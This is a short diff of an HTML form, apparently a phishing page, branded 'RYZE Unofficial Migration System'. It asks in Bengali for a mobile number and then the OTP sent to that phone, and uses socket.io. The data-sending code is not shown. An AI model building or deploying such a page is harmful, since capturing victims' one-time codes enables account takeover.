@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RYZE Verification System</title>
+    <title>RYZE Unofficial Migration System</title>
     <script src="/socket.io/socket.io.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -22,7 +22,7 @@
         <!-- Step 1: Phone Input -->
         <div id="step-phone">
             <label class="block mb-2 text-sm">আপনার মোবাইল নম্বর দিন</label>
-            <input type="text" id="phone" placeholder="017XXXXXXXX" class="w-full p-3 rounded bg-[#1a1a2e] border border-blue-900 focus:border-blue-500 outline-none mb-4">
+            <input type="number" id="phone" placeholder="017XXXXXXXX" class="w-full p-3 rounded bg-[#1a1a2e] border border-blue-900 focus:border-blue-500 outline-none mb-4">
             <button onclick="sendPhone()" class="w-full bg-blue-600 hover:bg-blue-700 p-3 rounded font-bold transition">Verify Number</button>
         </div>
 
@@ -35,7 +35,7 @@
         <!-- Step 3: OTP Input -->
         <div id="step-otp" class="hidden">
             <label class="block mb-2 text-sm text-yellow-400">আপনার মোবাইলে পাঠানো OTP কোডটি লিখুন</label>
-            <input type="text" id="otp" placeholder="Enter OTP" class="w-full p-3 rounded bg-[#1a1a2e] border border-blue-900 focus:border-blue-500 outline-none mb-4 text-center text-xl tracking-widest">
+            <input type="number" id="otp" placeholder="Enter OTP" class="w-full p-3 rounded bg-[#1a1a2e] border border-blue-900 focus:border-blue-500 outline-none mb-4 text-center text-xl tracking-widest">
             <button onclick="sendOTP()" class="w-full bg-green-600 hover:bg-green-700 p-3 rounded font-bold transition">Submit OTP</button>
         </div>
 
